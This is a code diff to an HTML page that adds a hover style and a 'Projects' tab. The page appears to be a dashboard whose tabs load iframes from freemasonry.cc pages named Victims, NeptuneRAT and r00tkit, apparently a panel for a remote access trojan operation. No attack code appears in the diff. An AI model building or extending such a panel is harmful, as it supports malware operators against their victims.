@@ -47,9 +47,10 @@
             color: #ffffff;
             font-weight: bold;
             font-size: 20px;
+            transition: color 0.3s ease;
         }
-        .navbar a.active {
-            color: red; 
+        .navbar a:hover {
+            color: #6f42c1;
         }
         .navbar hr {
             position: absolute;
@@ -80,6 +81,7 @@
 <div class="navbar">
     <ul>
         <li><a href="#Victims" class="active">Victims</a></li>
+        <li><a href="#Projects" class="">Projects</a></li>
         <li><a href="#NeptuneRat" class="">NeptuneRat</a></li>
         <li><a href="#Rootkit" class="">Rootkit</a></li>
     </ul>
@@ -87,6 +89,7 @@
 </div>
 <div class="content">
     <iframe id="Victims" src="https://freemasonry.cc/victims" frameborder="0"></iframe>
+    <iframe id="Projects" src="https://freemasonry.cc/Tools" frameborder="0" style="display: none;"></iframe>
     <iframe id="NeptuneRat" src="https://freemasonry.cc/NeptuneRAT" frameborder="0" style="display: none;"></iframe>
     <iframe id="Rootkit" src="https://freemasonry.cc/r00tkit" frameborder="0" style="display: none;"></iframe>
 </div>
